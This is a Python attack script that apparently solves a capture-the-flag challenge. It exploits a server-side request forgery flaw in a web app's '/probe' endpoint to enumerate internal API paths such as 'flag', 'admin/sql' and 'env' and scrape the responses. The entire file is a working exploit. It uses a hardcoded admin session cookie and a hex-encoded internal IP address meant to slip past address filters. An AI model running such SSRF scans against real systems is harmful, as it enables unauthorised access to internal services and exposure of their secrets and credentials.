#!/usr/bin/env python3
"""Scan internal-api paths via SSRF and extract results."""
import requests
import re
import sys
import html as html_mod

SESSION = "session=eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYWRtaW4ifQ.amiz9w.0WjzyknMhK0dclFCs8-dT-9hk6I"

paths = [
    "debug/config", "health", "status",
    "api", "api/v1", "api/v1/query", "api/v1/sql", "api/v1/db", "api/v1/flag",
    "query", "sql", "db", "database", "execute", "exec", "run",
    "admin", "admin/query", "admin/sql", "admin/db", "admin/flag",
    "debug", "debug/sql", "debug/db", "debug/query", "debug/exec", "debug/flag",
    "config", "config/db", "config/database",
    "internal", "internal/query", "internal/sql", "internal/db",
    "flag", "secret", "flag.txt",
    "api/query", "api/sql", "api/execute", "api/run",
    "v1", "v1/query", "v1/sql", "v2", "v2/query",
    "metrics", "info", "version", "env",
    "api/debug", "api/debug/config", "api/debug/sql",
    "db/query", "db/execute", "db/sql",
]

for path in paths:
    try:
        resp = requests.post(
            "http://10.0.174.208:80/probe",
            headers={
                "Content-Type": "application/x-www-form-urlencoded",
                "Cookie": SESSION,
            },
            data={
                "target_url": f"http://0xAC.0x12.0x00.0x02:5000/{path}",
                "timeout": "10",
                "follow_redirect": "on",
            },
            timeout=25,
        )
        text = resp.text
        
        # Extract status code
        status_match = re.search(r'状态码.*?header-item">(\d+)', text)
        content_len_match = re.search(r'内容长度.*?header-item">([^<]+)', text)
        content_type_match = re.search(r'Content-Type.*?header-item">([^<]+)', text)
        
        # Extract body preview
        body_match = re.search(r'<pre[^>]*>(.*?)</pre>', text, re.DOTALL)
        body = ""
        if body_match:
            body = html_mod.unescape(body_match.group(1)).strip()
        
        # Check for errors
        error_match = re.search(r'alert-danger[^>]*>(.*?)</div>', text, re.DOTALL)
        
        status = status_match.group(1) if status_match else "?"
        clen = content_len_match.group(1) if content_len_match else "-"
        ctype = content_type_match.group(1) if content_type_match else "-"
        
        if error_match:
            error = re.sub(r'<[^>]+>', '', error_match.group(1)).strip()
            print(f"/{path}: ERROR - {error[:80]}")
        elif status != "?" or body:
            body_preview = body[:80].replace('\n', ' ')
            print(f"/{path}: {status} | {clen}B | {ctype} | {body_preview}")
        else:
            print(f"/{path}: NO_RESULT")
    except Exception as e:
        print(f"/{path}: EXCEPTION - {e}")
